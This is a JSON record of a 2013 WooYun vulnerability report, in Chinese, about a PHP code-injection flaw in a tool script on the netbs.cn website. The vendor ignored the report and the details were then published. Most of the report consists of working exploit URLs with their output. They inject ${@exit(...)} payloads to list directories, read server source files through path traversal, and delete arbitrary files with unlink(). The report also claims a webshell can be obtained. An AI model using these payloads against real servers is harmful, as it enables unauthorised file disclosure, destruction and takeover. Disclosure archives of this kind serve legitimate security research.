{"id": 60598, "wybug_id": "wooyun-2013-042626", "wybug_title": "网博士存在远程PHP代码执行漏洞", "wybug_corp": "网博士", "wybug_author": "w5r2", "wybug_date": "2013-11-12 17:04", "wybug_open_date": "2013-12-27 17:05", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["文件上传内容未检查"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-12：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-12-27：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 代码未过滤敏感字符，导致远程加载PHP代码执行代码。 详细说明：  \nhttp://www.netbs.cn/tool/yb/yb.php?q=${@exit(print_r(scandir($_GET[d])))}&d=../../\n\n\n\nArray(    [0] => .    [1] => ..    [2] => 123    [3] => 168    [4] => 20130720195947.rar    [5] => 2345    [6] => 360buy-union.txt    [7] => 82051.txt    [8] => HTML    [9] => Plugins    [10] => Top-verification.html    [11] => _WU8G02t5Wuoiw5yWg4Cfd4wz5g.html    [12] => a    [13] => about    [14] => ad    [15] => api    [16] => aspnet_client    [17] => baidu_verify_729eGdarRG.html    [18] => baidunews.xml    [19] => bbs    [20] => bdsitemap.txt    [21] => bdunion.txt    [22] => cert    [23] => check.txt    [24] => css    [25] => en    [26] => favicon.ico    [27] => google59c3fe0e4120c597.html    [28] => gs_union_verify_file.html    [29] => home    [30] => images    [31] => include    [32] => index    [33] => index.html    [34] => index.php    [35] => info    [36] => kLtLsTFNw_UD3XyZOfqZvQrBNHc.html    [37] => license.txt    [38] => main    [39] => mainindex.html    [40] => member    [41] => netbsdede    [42] => netbsmain.html    [43] => news    [44] => plus    [45] => qqmail_domain_verify.txt    [46] => robots.php    [47] => robots.txt    [48] => robots2.txt    [49] => shop    [50] => shuiyin.jpg    [51] => sitemap.html    [52] => sitemap.xml    [53] => sitemaps.xml    [54] => special    [55] => tags.php    [56] => templets    [57] => tool    [58] => uc_client    [59] => upload.php    [60] => uploads    [61] => version.inc.php)1\n可以查看任意文件\nArray(    [0] => <?php    [1] => function is_domain($domain){    [2] => \tif(preg_match(\"/^([0-9a-z\\-]{1,}\\.)?[0-9a-z\\-]{2,}\\.([0-9a-z\\-]{2,}\\.)?[a-z]{2,}$/i\", $domain))\t{    [3] => \t\treturn true;    [4] => \t}else{    [5] => \t\treturn false;    [6] => \t}    [7] => }    [8] =>     [9] => function get_content($url){    [10] => \tif(!strpos($url, '://')) return 'Invalid URI';    [11] => \t$content = '';    [12] => \tif(ini_get('allow_url_fopen')){    [13] => \t    $cnt=0;    [14] =>         while($cnt < 15 && ($content=@file_get_contents($url))===FALSE) $cnt++;\t\t    [15] => \t}    [16] => \telseif(function_exists('curl_init')){    [17] => \t\t$handle = curl_init();    [18] => \t\tcurl_setopt($handle, CURLOPT_URL, $url);    [19] => \t\tcurl_setopt($handle, CURLOPT_CONNECTTIMEOUT, 5);    [20] => \t\tcurl_setopt($handle, CURLOPT_RETURNTRANSFER, 1);    [21] => \t\tcurl_setopt($handle, CURLOPT_FOLLOWLOCATION, 0);    [22] => \t\t$content = curl_exec($handle);    [23] => \t\tcurl_close($handle);    [24] => \t}    [25] => \telseif(function_exists('fsockopen')){    [26] => \t\t$urlinfo = parse_url($url);    [27] => \t\t$host    = $urlinfo['host'];    [28] => \t\t$str     = explode($host, $url);    [29] => \t\t$uri     = $str[1];    [30] => \t\tunset($urlinfo, $str);    [31] => \t\t$content = '';    [32] => \t\t$fp = fsockopen($host, 80, $errno, $errstr, 30);    [33] => \t\tif(!$fp){    [34] => \t\t\t$content = 'Can Not Open Socket...';    [35] => \t\t}    [36] => \t\telse{    [37] => \t\t\t$out = \"GET $uri   HTTP/1.1\\r\\n\";    [38] => \t\t\t$out.= \"Host: $host \\r\\n\";    [39] => \t\t\t$out.= \"Accept: */*\\r\\n\";    [40] => \t\t\t$out.= \"User-Agent: $_SERVER[HTTP_USER_AGENT]\\r\\n\";    [41] => \t\t\t$out.= \"Connection: Close\\r\\n\\r\\n\";    [42] => \t\t\tfputs($fp, $out);    [43] => \t\t\twhile (!feof($fp)){    [44] => \t\t\t\t$content .= fgets($fp, 4069);    [45] => \t\t\t}    [46] => \t\t\tfclose($fp);    [47] => \t\t}    [48] => \t}    [49] => \tif(empty($content)) $content = '无法打开该链接！';    [50] => \treturn $content;    [51] => }    [52] => ?>)\n\nview-source:http://www.netbs.cn/tool/yb/yb.php?q=${@exit(print_r(file($_GET[d])))}&d=../../tool/global.php\n可以删除文件\n删除文件，参数n为文件名\nhttp://www.netbs.cn/yb/yb.php?q=${@exit(var_dump(unlink($_GET[n])))}&n=./../xxxx.txt还可以直接获取webshell   漏洞证明：  如上所示   修复方案：  过滤敏感字符！   版权声明：转载请注明来源 w5r2@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}